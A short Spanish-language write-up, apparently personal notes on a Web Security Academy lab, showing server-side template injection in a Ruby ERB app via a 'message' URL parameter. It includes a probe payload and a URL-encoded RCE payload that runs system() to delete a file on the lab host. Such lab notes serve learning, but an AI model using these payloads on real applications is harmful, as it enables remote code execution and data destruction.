![[Pasted image 20221018130803.png]]

![[Pasted image 20221018130938.png]]

si trato de ver algun detalle del producto:

![[Pasted image 20221018131014.png]]


el link es este: https://0a2900690342c013c051373c00fe00ea.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock

tratando de usar este payload: ?message=<%25%3d+7*7+%25>

![[Pasted image 20221018131136.png]]


la aplicacion usa ruby y esta usando un template tipo erb, de acuerdo a la documentacion se puede tener RCE con un ejemplo como este

<%= system("rm /home/carlos/morale.txt") %>

el payload quedará así: ?message=<%25+system("rm+/home/carlos/morale.txt")+%25>

![[Pasted image 20221018131633.png]]